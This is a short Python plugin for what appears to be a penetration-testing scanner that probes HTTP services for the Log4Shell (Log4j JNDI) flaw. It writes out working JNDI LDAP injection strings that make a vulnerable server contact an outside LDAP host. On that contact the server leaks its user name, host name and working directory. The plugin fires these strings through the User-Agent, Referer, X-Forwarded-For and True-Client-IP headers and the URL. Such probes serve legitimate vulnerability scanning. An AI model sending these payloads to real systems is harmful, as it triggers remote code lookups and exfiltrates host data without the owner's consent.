#!/usr/bin/env python3
# coding=utf-8

from lib.poc.dummy import *
import lib.config as conf


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if not conf.ldap_log_server:
        return

    payloads = [
        '${jndi:ldap://' + conf.ldap_log_server + '/'
        'easy-pen/user/${env:USER}/host/${env:hostName}/pwd/${env:PWD}}}',
        '${jndi:ldap://' + conf.ldap_log_server + '/'
        'easy-pen-upper-hostname/user/${env:USER}/host/${env:HOSTNAME}/pwd/${env:PWD}}}']

    for s in payloads:
        headers = {"Connection": "close", "User-Agent": s, "Referer": s, "True-Client-IP": s, "X-Forwarded-For": s}
        try:
            url = "{}://{}:{}/?{}".format(service, ip, port, s)
            await http_client(ip, port).get(url, headers=headers, timeout=20)
        except Exception as e:
            debug(e)


if __name__ == "__main__":
    scan = do_scan('easypen-test.lijiejie.com', 8983, 'http', True, {})
    run_plugin_test(scan)

